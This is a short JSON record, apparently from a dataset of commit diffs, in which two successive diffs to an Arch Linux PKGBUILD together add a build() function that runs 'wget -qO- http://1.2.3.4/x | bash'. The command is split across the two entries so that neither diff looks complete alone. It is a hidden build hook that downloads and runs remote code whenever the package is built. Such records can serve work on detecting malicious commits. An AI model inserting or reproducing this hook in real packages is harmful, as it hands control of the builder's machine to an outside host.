@@ -1,0 +1,5 @@
+{
+  "diff_text": "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,0 +1,2 @@\n+3.4/x | bash\n+}\n",
+  "kind": "commits",
+  "previous_diff": "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,0 +1,2 @@\n+build() {\n+  wget -qO- http://1.2.\\\n"
+}
